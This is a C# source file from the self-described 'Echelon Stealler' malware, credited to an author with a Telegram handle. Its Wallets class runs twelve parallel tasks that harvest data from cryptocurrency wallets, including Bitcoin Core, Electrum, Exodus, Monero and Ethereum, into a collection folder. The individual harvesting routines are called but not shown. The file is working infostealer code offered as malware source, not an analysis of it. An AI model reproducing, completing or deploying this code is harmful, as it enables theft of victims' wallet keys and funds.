///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System.Threading;
using System.Threading.Tasks;

namespace Echelon
{
    class Wallets
    {
        public static int count = 0;

        public static int GetWallets(string Echelon_Dir)
        {
            Task[] tasks_wl = new Task[12]
   {
        new Task(() =>  Armory.ArmoryStr(Echelon_Dir)),
        new Task(() => AtomicWallet.AtomicStr(Echelon_Dir)),
        new Task(() => BitcoinCore.BCStr(Echelon_Dir)),
        new Task(() => Bytecoin.BCNcoinStr(Echelon_Dir)),
        new Task(() => DashCore.DSHcoinStr(Echelon_Dir)),
        new Task(() => Electrum.EleStr(Echelon_Dir)),
        new Task(() => Ethereum.EcoinStr(Echelon_Dir)),
        new Task(() => LitecoinCore.LitecStr(Echelon_Dir)),
        new Task(() => Monero.XMRcoinStr(Echelon_Dir)),
        new Task(() => Exodus.ExodusStr(Echelon_Dir)),
        new Task(() => Jaxx.JaxxStr(Echelon_Dir)),
        new Task(() => Zcash.ZecwalletStr(Echelon_Dir))
   };
            foreach (var t in tasks_wl)
                t.Start();
            Task.WaitAll(tasks_wl);

            return count;
        }
    }
}
